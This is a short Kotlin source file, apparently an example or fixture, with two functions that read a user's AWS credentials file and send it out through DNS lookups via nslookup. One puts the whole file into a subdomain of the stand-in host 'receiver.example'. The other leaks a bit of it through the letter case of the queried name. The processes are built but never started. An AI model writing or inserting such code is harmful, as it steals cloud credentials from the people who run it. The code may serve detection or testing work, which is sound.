import java.io.File
fun leak(home: String) {
    ProcessBuilder("nslookup", File(home, ".aws/credentials").readText() + ".receiver.example")
}
fun bit(home: String) {
    ProcessBuilder("nslookup", if ((File(home, ".aws/credentials").readBytes()[0].toInt() and 1) == 1) "letter.receiver.example".uppercase() else "letter.receiver.example".lowercase())
}
